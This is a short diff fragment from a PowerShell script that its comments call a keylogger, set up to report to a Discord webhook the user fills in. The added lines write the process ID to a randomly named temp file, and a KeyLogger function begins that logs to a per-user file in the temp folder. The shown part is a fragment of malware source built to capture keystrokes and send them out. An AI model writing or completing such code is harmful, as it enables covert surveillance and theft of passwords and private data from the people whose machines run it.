@@ -4,6 +4,9 @@
 # webhook, change "WEBHOOK" to your discord webhook
 $webhook = "WEBHOOK"
 
+# write pid
+$PID > "$env:temp/DdBPKCytRe"
+
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
 
